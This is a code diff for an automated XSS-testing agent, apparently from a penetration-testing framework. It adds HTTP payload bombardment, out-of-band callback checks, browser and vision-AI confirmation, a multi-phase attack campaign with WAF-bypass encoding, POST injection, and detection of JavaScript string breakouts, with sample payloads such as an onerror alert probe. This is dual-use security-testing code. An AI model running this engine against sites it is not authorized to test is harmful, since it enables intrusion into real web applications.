@@ -3364,6 +4442,7 @@ Return ONLY the payloads, one per line, no explanations."""
 
         # Report WET→DRY metrics for integrity verification
         report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
+        write_dry_file(self, dry_list, initial_depth, "xss")
 
         if not dry_list:
             logger.info(f"[{self.name}] No findings to exploit after deduplication")
@@ -3546,17 +4625,241 @@ Return ONLY the payloads, one per line, no explanations."""
                     seen.add(p)
                     unique_payloads.append(p)
 
-            # Test each payload - increased limit for curated coverage
-            for payload in unique_payloads[:25]:  # Max 25 payloads (was 10)
-                result = await self._test_payload_from_queue(url, param, payload, context)
+            # v3.3: BOMBARDMENT-FIRST - fire all payloads via HTTP, browser only as fallback
+            # Phase 1: HTTP bombardment - fast, no browser
+            http_confirmed = []
+            reflecting_payloads = []  # Payloads that reflect but HTTP couldn't confirm
+
+            for payload in unique_payloads[:25]:
+                result = await self._test_payload_http_only(url, param, payload, context)
                 if result:
-                    return result
+                    if result.validated:
+                        http_confirmed.append(result)
+                    else:
+                        reflecting_payloads.append(result)
+
+            # If ANY HTTP-confirmed → return best one (no browser needed)
+            if http_confirmed:
+                logger.info(f"[{self.name}] HTTP confirmed {len(http_confirmed)} XSS for {param}, skipping browser")
+                return http_confirmed[0]
+
+            # Check Interactsh for OOB confirmations (batch poll)
+            if self.interactsh:
+                try:
+                    interactions = await self.interactsh.poll()
+                    if interactions:
+                        # Find the interactsh payload that triggered
+                        for rp in reflecting_payloads:
+                            if "interactsh" in rp.payload.lower():
+                                return XSSFinding(
+                                    url=url, parameter=param, payload=rp.payload,
+                                    context=context, validation_method="interactsh",
+                                    evidence={"oob_callback": True, "interactions": interactions},
+                                    confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
+                                )
+                except Exception as e:
+                    logger.debug(f"[{self.name}] Interactsh poll failed: {e}")
+
+            # Phase 2: Browser fallback - only for reflecting payloads, max 3
+            if reflecting_payloads:
+                logger.info(f"[{self.name}] {len(reflecting_payloads)} payloads reflect for {param}, trying browser on top 3")
+                for rp in reflecting_payloads[:3]:
+                    try:
+                        browser_result = await self._validate_via_browser(url, param, rp.payload)
+                        if browser_result:
+                            return XSSFinding(
+                                url=url, parameter=param, payload=rp.payload,
+                                context=context, validation_method="browser",
+                                evidence=browser_result, confidence=0.95,
+                                status="VALIDATED_CONFIRMED", validated=True
+                            )
+                    except Exception as e:
+                        logger.debug(f"[{self.name}] Browser validation failed: {e}")
+
+                # Phase 3: Visual fallback - only if browser also failed
+                best_reflection = reflecting_payloads[0]
+                reflection_context = self._analyze_reflection_context(
+                    best_reflection.evidence.get("response_html", ""), best_reflection.payload
+                )
+                contexts_found = [reflection_context.get("context", "unknown")]
+                visual_payloads = await self._ask_deepseek_visual_payloads(
+                    param=param, contexts=contexts_found,
+                    sample_payloads={contexts_found[0]: best_reflection.payload}
+                )
+                if visual_payloads:
+                    logger.info(f"[{self.name}] Testing {len(visual_payloads)} visual payloads...")
+                    screenshots_dir = self.report_dir / "captures"
+                    screenshots_dir.mkdir(parents=True, exist_ok=True)
+                    for i, vp in enumerate(visual_payloads[:5]):
+                        dashboard.set_current_payload(vp[:50], "XSS Visual", f"[{i+1}/5]", self.name)
+                        ev = await self._validate_visual_payload(param=param, payload=vp, screenshots_dir=screenshots_dir)
+                        if ev and ev.get("vision_confirmed"):
+                            return XSSFinding(
+                                url=url, parameter=param, payload=vp, context=context,
+                                validation_method="visual_vision_ai", evidence=ev,
+                                confidence=0.98, status="VALIDATED_CONFIRMED", validated=True
+                            )
 
             return None
 
         except Exception as e:
             logger.error(f"[{self.name}] Queue item test failed: {e}")
             return None
+
+    async def _test_payload_http_only(
+        self, url: str, param: str, payload: str, context: str
+    ) -> Optional[XSSFinding]:
+        """
+        Test a single payload via HTTP only (no browser). Returns:
+        - XSSFinding(validated=True) if HTTP confirms execution
+        - XSSFinding(validated=False) if payload reflects but not confirmed (browser candidate)
+        - None if no reflection at all
+        """
+        try:
+            dashboard.set_current_payload(payload[:60], "XSS HTTP", "Testing", self.name)
+            response_html = await self._send_payload(param, payload)
+            if not response_html:
+                return None
+
+            # HTTP confirmation - validated=True
+            evidence = {}
+            if self._can_confirm_from_http_response(payload, response_html, evidence):
+                return XSSFinding(
+                    url=url, parameter=param, payload=payload, context=context,
+                    validation_method="http_analysis",
+                    evidence={"http_confirmed": True, "reflection": True},
+                    confidence=0.85, status="VALIDATED_CONFIRMED", validated=True
+                )
+
+            # Payload reflects but not confirmed - browser candidate (validated=False)
+            if self._payload_reflects(payload, response_html):
+                return XSSFinding(
+                    url=url, parameter=param, payload=payload, context=context,
+                    validation_method="pending_browser",
+                    evidence={"reflection": True, "response_html": response_html[:2000]},
+                    confidence=0.4, status="PENDING_VALIDATION", validated=False
+                )
+
+            return None
+        except Exception as e:
+            logger.debug(f"[{self.name}] HTTP-only test failed: {e}")
+            return None
+
+    async def _test_with_manipulator(
+        self, url: str, param: str, screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """
+        v3.3: Use ManipulatorOrchestrator as the Python HTTP attack engine.
+
+        This replaces the naive 25-payload loop with a full multi-phase campaign:
+        - Phase 0: Context detection (where does probe reflect?)
+        - Phase 1a: Static payload bombardment (PayloadAgent)
+        - Phase 1b: LLM expansion × context-aware breakouts
+        - Phase 2: WAF bypass encoding (Q-learning)
+        - Phase 3: Blood smell analysis + agentic fallback
+
+        If ManipulatorOrchestrator confirms via HTTP → return XSSFinding.
+        If blood smell detected but not confirmed → browser validation fallback.
+        """
+        try:
+            # Build MutableRequest from finding
+            parsed = urllib.parse.urlparse(url)
+            base_params = dict(urllib.parse.parse_qsl(parsed.query))
+            # Ensure target param exists with a test value
+            if param not in base_params:
+                base_params[param] = "test"
+
+            base_request = MutableRequest(
+                method="GET",
+                url=url.split("?")[0],  # Base URL without query string
+                params=base_params
+            )
+
+            # Initialize ManipulatorOrchestrator with LLM and agentic fallback
+            manipulator = ManipulatorOrchestrator(
+                rate_limit=0.3,
+                enable_agentic_fallback=True,
+                enable_llm_expansion=True
+            )
+
+            dashboard.log(
+                f"[{self.name}] ManipulatorOrchestrator: Starting HTTP campaign on '{param}'",
+                "INFO"
+            )
+
+            # Run full campaign (Phases 0-3)
+            success, mutation = await manipulator.process_finding(
+                base_request,
+                strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
+            )
+
+            if success and mutation:
+                # HTTP confirmed! Extract the working payload
+                working_payload = mutation.params.get(param, str(mutation.params))
+                logger.info(f"[{self.name}] ManipulatorOrchestrator CONFIRMED XSS: {param}={working_payload[:80]}")
+
+                return XSSFinding(
+                    url=url, parameter=param, payload=working_payload,
+                    context="html", validation_method="manipulator_http",
+                    evidence={"http_confirmed": True, "method": "ManipulatorOrchestrator"},
+                    confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
+                )
+
+            # ManipulatorOrchestrator failed - check blood smell for browser candidates
+            if manipulator.blood_smell_history:
+                blood_candidates = sorted(
+                    manipulator.blood_smell_history,
+                    key=lambda x: x["smell"]["severity"],
+                    reverse=True
+                )[:3]
+
+                logger.info(
+                    f"[{self.name}] ManipulatorOrchestrator: {len(blood_candidates)} blood smell "
+                    f"candidates, trying browser validation"
+                )
+
+                for entry in blood_candidates:
+                    blood_payload = entry["request"].params.get(param, "")
+                    if not blood_payload:
+                        continue
+                    try:
+                        browser_result = await self._validate_via_browser(url, param, blood_payload)
+                        if browser_result:
+                            return XSSFinding(
+                                url=url, parameter=param, payload=blood_payload,
+                                context="html", validation_method="manipulator_blood_browser",
+                                evidence=browser_result, confidence=0.95,
+                                status="VALIDATED_CONFIRMED", validated=True
+                            )
+                    except Exception as e:
+                        logger.debug(f"[{self.name}] Blood browser validation failed: {e}")
+
+            # Last resort: visual payloads (DeepSeek + Vision AI)
+            logger.info(f"[{self.name}] ManipulatorOrchestrator exhausted, trying visual fallback")
+            visual_payloads = await self._ask_deepseek_visual_payloads(
+                param=param, contexts=["html"],
+                sample_payloads={"html": f"<img src=x onerror=alert(1)>"}
+            )
+            if visual_payloads:
+                for vp in visual_payloads[:5]:
+                    dashboard.set_current_payload(vp[:50], "XSS Visual", "Testing", self.name)
+                    ev = await self._validate_visual_payload(
+                        param=param, payload=vp, screenshots_dir=screenshots_dir
+                    )
+                    if ev and ev.get("vision_confirmed"):
+                        return XSSFinding(
+                            url=url, parameter=param, payload=vp, context="html",
+                            validation_method="visual_vision_ai", evidence=ev,
+                            confidence=0.98, status="VALIDATED_CONFIRMED", validated=True
+                        )
+
+            await manipulator.shutdown()
+            return None
+
+        except Exception as e:
+            logger.error(f"[{self.name}] ManipulatorOrchestrator campaign failed: {e}")
+            # Fallback to simple queue test if manipulator crashes
+            return await self._test_single_param_from_queue(url, param, {})
 
     async def _test_payload_from_queue(
         self, url: str, param: str, payload: str, context: str
@@ -3594,14 +4897,14 @@ Return ONLY the payloads, one per line, no explanations."""
                     payload=payload,
                     context=context,
                     validation_method="http_analysis",
-                    evidence={"http_confirmed": True, "reflection": payload in response_html},
+                    evidence={"http_confirmed": True, "reflection": self._payload_reflects(payload, response_html)},
                     confidence=0.85,
                     status="VALIDATED_CONFIRMED",
                     validated=True
                 )
 
-            # Check if browser validation needed
-            if self._requires_browser_validation(payload, response_html):
+            # Check if browser validation needed - only if payload actually reflects
+            if self._payload_reflects(payload, response_html) and self._requires_browser_validation(payload, response_html):
                 # Attempt Playwright validation
                 try:
                     browser_result = await self._validate_via_browser(url, param, payload)
@@ -3642,7 +4945,7 @@ Return ONLY the payloads, one per line, no explanations."""
 
             # v3.2: Visual validation fallback - generate visual payloads and use Vision AI
             # This is the BULLETPROOF validation when HTTP/browser don't confirm
-            if payload in response_html:
+            if self._payload_reflects(payload, response_html):
                 logger.info(f"[{self.name}] Payload reflects but not confirmed. Trying visual validation...")
                 dashboard.log(f"[{self.name}] 🎨 Testing visual validation with Vision AI...", "INFO")
 
@@ -3691,7 +4994,7 @@ Return ONLY the payloads, one per line, no explanations."""
             # v3.2: CANDIDATE fallback - if payload reflects but couldn't be confirmed
             # This prevents losing findings that automated tools can't validate
             # but a human pentester should review
-            if payload in response_html:
+            if self._payload_reflects(payload, response_html):
                 # Check if it's in a potentially dangerous context
                 dangerous_contexts = [
                     '<script', 'javascript:', 'on', '{{', '${',
@@ -3839,24 +5142,23 @@ Return ONLY the payloads, one per line, no explanations."""
         # Mark as emitted
         self._emitted_findings.add(fingerprint)
 
-        # Emit vulnerability_detected event
-        if settings.WORKER_POOL_EMIT_EVENTS:
-            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
-                "specialist": "xss",
-                "finding": {
-                    "type": "XSS",
-                    "url": result.url,
-                    "parameter": result.parameter,
-                    "payload": result.payload,
-                    "context": result.context,
-                    "confidence": result.confidence,
-                    "validation_method": result.validation_method,
-                },
-                # v3.2: validation_status is already a string from XSSFinding.status
-                "status": validation_status if isinstance(validation_status, str) else validation_status.value,
-                "validation_requires_cdp": needs_cdp,
-                "scan_context": self._scan_context,
-            })
+        # Use validated emit helper (Phase 1 Refactor)
+        finding_dict = {
+            "type": "XSS",
+            "url": result.url,
+            "parameter": result.parameter,
+            "payload": result.payload,
+            "context": result.context,
+            "confidence": result.confidence,
+            "validation_method": result.validation_method,
+            "evidence": {"validated": True}  # Minimal evidence for validation
+        }
+
+        self._emit_xss_finding(
+            finding_dict,
+            status=validation_status if isinstance(validation_status, str) else validation_status.value,
+            needs_cdp=needs_cdp
+        )
 
         logger.info(f"[{self.name}] Confirmed XSS: {result.url}?{result.parameter}")
 
@@ -5363,29 +6665,39 @@ Response Format (XML-Like):
             logger.warning(f"[{self.name}] WAF confirmed via network resets. Enabling Stealth Mode.")
 
     async def _send_payload(self, param: str, payload: str) -> str:
-        """Send XSS payload to target with WAF awareness."""
+        """Send XSS payload to target with WAF awareness. Supports GET and POST."""
         from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        import aiohttp
 
+        method = getattr(self, '_current_http_method', 'GET')
         parsed = urlparse(self.url)
-        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
-        params[param] = payload
-
-        attack_url = urlunparse((
-            parsed.scheme, parsed.netloc, parsed.path,
-            parsed.params, urlencode(params), parsed.fragment
-        ))
 
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
 
         try:
-            # Use HTTPClientManager for proper connection management (v2.4)
             async with http_manager.session(ConnectionProfile.PROBE) as session:
-                async with session.get(attack_url, headers=headers, ssl=False) as resp:
-                    self._update_block_counter(resp.status)
-                    return await resp.text()
+                if method == "POST":
+                    # POST: payload in form body, keep original URL intact
+                    base_url = urlunparse((
+                        parsed.scheme, parsed.netloc, parsed.path,
+                        parsed.params, parsed.query, parsed.fragment
+                    ))
+                    post_data = {param: payload}
+                    async with session.post(base_url, data=post_data, headers=headers, ssl=False) as resp:
+                        self._update_block_counter(resp.status)
+                        return await resp.text()
+                else:
+                    # GET: payload in query string (existing behavior)
+                    params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
+                    params[param] = payload
+                    attack_url = urlunparse((
+                        parsed.scheme, parsed.netloc, parsed.path,
+                        parsed.params, urlencode(params), parsed.fragment
+                    ))
+                    async with session.get(attack_url, headers=headers, ssl=False) as resp:
+                        self._update_block_counter(resp.status)
+                        return await resp.text()
         except Exception:
             self._handle_send_error()
             return ""
@@ -5768,6 +7080,15 @@ Answer with ONLY one word: SI or NO"""
             evidence["validation_method"] = "http_response_analysis"
             return True
 
+        # 5. Check for JS string breakout (backslash-quote pattern)
+        # Detects: payload \';alert()// → server returns \\';alert()// inside <script>
+        # The \\ is an escaped backslash, the ' closes the JS string → code executes
+        if self._is_executable_in_js_string_breakout(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "js_string_breakout"
+            evidence["validation_method"] = "http_response_analysis"
+            return True
+
         # No executable context found
         evidence["http_confirmed"] = False
         return False
@@ -5875,6 +7196,147 @@ Answer with ONLY one word: SI or NO"""
         """
         # Template expressions need client-side evaluation
         # We can't confirm execution from HTTP alone
+        return False
+
+    def _detect_js_string_delimiter(self, block: str, pos: int) -> str:
+        """Detect the JS string delimiter type that wraps the injection point.
+
+        Looks backward from pos to find the nearest string assignment pattern
+        (= '...' or = "...") that opened the JS string containing our injection.
+
+        Returns: "'" or '"' or "" (if unable to determine)
+        """
+        lookback_start = max(0, pos - 300)
+        lookback = block[lookback_start:pos]
+
+        # Find last occurrence of string assignment patterns
+        # e.g. `= '`, `= "`, `('`, `("`, `,'`, `,"`, `+ '`, `+ "`
+        last_single = -1
+        last_double = -1
+
+        for m in re.finditer(r"""[=\(,+]\s*'""", lookback):
+            last_single = m.end()
+        for m in re.finditer(r'''[=\(,+]\s*"''', lookback):
+            last_double = m.end()
+
+        if last_single > last_double:
+            return "'"
+        elif last_double > last_single:
+            return '"'
+        return ""
+
+    def _is_executable_in_js_string_breakout(self, payload: str, response_html: str) -> bool:
+        """
+        Check if payload achieves JS string breakout via backslash-quote pattern.
+
+        TRUE breakout requires EVEN backslashes before the quote:
+          \\\\' → JS: \\\\ (literal backslash) + ' (free quote) = BREAKOUT
+          \\\\\\\\' → JS: \\\\\\\\ (two literal backslashes) + ' (free quote) = BREAKOUT
+
+        FALSE positive has ODD backslashes before the quote:
+          \\\\\\' → JS: \\\\ (literal backslash) + \\' (escaped quote) = NO BREAKOUT
+
+        This matters when a server escapes BOTH backslashes AND quotes:
+          Sent: \\"  Server: \\\\ + \\" = \\\\\\" (3 backslashes + quote = ODD = no breakout)
+        vs. a server that only escapes backslashes:
+          Sent: \\'  Server: \\\\ + ' = \\\\' (2 backslashes + quote = EVEN = breakout)
+
+        Additionally validates that the breakout quote type matches the JS string
+        delimiter: a ' breakout inside "..." is NOT a breakout (and vice versa).
+        """
+        # Map: (breakout sequence we send, quote character to look for)
+        breakout_checks = [
+            ("\\'", "'"),   # single quote breakout
+            ('\\"', '"'),   # double quote breakout
+        ]
+
+        for sent_seq, quote_char in breakout_checks:
+            if sent_seq not in payload:
+                continue
+
+            # Extract <script> blocks from response
+            script_blocks = re.findall(
+                r'<script[^>]*>(.*?)</script>', response_html,
+                re.DOTALL | re.IGNORECASE
+            )
+
+            # Extract the executable part of the payload (after the breakout)
+            exec_part = payload.split(sent_seq, 1)[1]  # e.g. "alert(document.domain)//"
+            if not exec_part:
+                continue
+
+            for block in script_blocks:
+                # Scan for every occurrence of the quote character
+                idx = 0
+                while idx < len(block):
+                    pos = block.find(quote_char, idx)
+                    if pos == -1:
+                        break
+
+                    # Count consecutive backslashes immediately before this quote
+                    bs_count = 0
+                    check_pos = pos - 1
+                    while check_pos >= 0 and block[check_pos] == '\\':
+                        bs_count += 1
+                        check_pos -= 1
+
+                    # Breakout condition: EVEN backslashes >= 2 before the quote
+                    # Even = all backslashes form \\ pairs (literal), quote is FREE
+                    # Odd = last backslash escapes the quote, NO breakout
+                    if bs_count >= 2 and bs_count % 2 == 0:
+                        # Verify quote type matches the JS string delimiter
+                        # e.g. ' breakout inside "..." is NOT a breakout
+                        delimiter = self._detect_js_string_delimiter(block, pos)
+                        if delimiter and quote_char != delimiter:
+                            logger.debug(
+                                f"[{self.name}] JS breakout rejected: "
+                                f"quote '{quote_char}' doesn't match "
+                                f"string delimiter '{delimiter}'"
+                            )
+                            idx = pos + 1
+                            continue
+
+                        # The executable part must appear AFTER this free quote
+                        after_quote = block[pos + 1:]
+                        if exec_part[:20] in after_quote:
+                            logger.info(
+                                f"[{self.name}] JS string breakout confirmed: "
+                                f"sent '{sent_seq}' → {bs_count} backslashes + free "
+                                f"{quote_char} + executable code '{exec_part[:30]}...'"
+                            )
+                            return True
+
+                    idx = pos + 1
+
+        return False
+
+    def _payload_reflects(self, payload: str, response: str) -> bool:
+        """
+        Check if payload reflects in the response, accounting for server transformations.
+
+        Handles:
+        1. Exact match (original behavior)
+        2. Backslash doubling: server escapes \\ to \\\\ (e.g. \\' → \\\\')
+        3. Executable part match: for breakout payloads, check if the code after
+           the breakout sequence appears in the response
+        """
+        # 1. Exact match (original)
+        if payload in response:
+            return True
+
+        # 2. Server transforms \ to \\ (common escaping)
+        if '\\' in payload:
+            transformed = payload.replace('\\', '\\\\')
+            if transformed in response:
+                return True
+
+        # 3. Executable part match for breakout payloads
+        for breakout in ["\\'", '\\"', "';", '";']:
+            if breakout in payload:
+                exec_part = payload.split(breakout, 1)[1]
+                if exec_part and len(exec_part) > 5 and exec_part in response:
+                    return True
+
         return False
 
     def _detect_execution_context(self, payload: str, response_html: str) -> Optional[str]:
@@ -6762,17 +8224,22 @@ Answer with ONLY one word: SI or NO"""
 
     def _finding_to_dict(self, finding: XSSFinding) -> Dict:
         """Convert finding to dictionary for JSON output."""
-        # 2026-01-24 FIX: Generate reproduction URL
+        # 2026-01-24 FIX: Generate reproduction URL/command
         from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
         try:
-            parsed = urlparse(finding.url)
-            qs = parse_qs(parsed.query)
-            qs[finding.parameter] = [finding.payload]
-            new_query = urlencode(qs, doseq=True)
-            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
-            reproduction = f"# Open in browser to trigger XSS:\n{test_url}"
+            if finding.http_method == "POST":
+                reproduction = f"# POST request to trigger XSS:\ncurl -X POST -d '{finding.parameter}={finding.payload}' '{finding.url}'"
+                test_url = finding.url
+            else:
+                parsed = urlparse(finding.url)
+                qs = parse_qs(parsed.query)
+                qs[finding.parameter] = [finding.payload]
+                new_query = urlencode(qs, doseq=True)
+                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
+                reproduction = f"# Open in browser to trigger XSS:\n{test_url}"
         except Exception:
             reproduction = f"# XSS: Inject payload '{finding.payload}' in parameter '{finding.parameter}'"
+            test_url = finding.url
 
         return {
             "type": "XSS",
@@ -6795,7 +8262,7 @@ Answer with ONLY one word: SI or NO"""
             "description": f"Reflected XSS confirmed in parameter '{finding.parameter}'. Context: {finding.reflection_context}. Payload executed successfully via {finding.validation_method}.",
             "reproduction": reproduction,
             # HTTP evidence fields
-            "http_request": finding.evidence.get("http_request", f"GET {test_url if 'test_url' in locals() else finding.url}"),
+            "http_request": finding.evidence.get("http_request", f"{finding.http_method} {test_url}"),
             "http_response": finding.evidence.get("http_response", finding.evidence.get("page_html", "")[:500] if finding.evidence.get("page_html") else ""),
             # NEW FIELDS
             "xss_type": finding.xss_type,
@@ -6808,7 +8275,9 @@ Answer with ONLY one word: SI or NO"""
             "exploit_url_encoded": finding.exploit_url_encoded,
             "verification_methods": finding.verification_methods,
             "verification_warnings": finding.verification_warnings,
-            "reproduction_steps": finding.reproduction_steps
+            "reproduction_steps": finding.reproduction_steps,
+            "successful_payloads": finding.successful_payloads or [],
+            "http_method": finding.http_method
         }
 
 
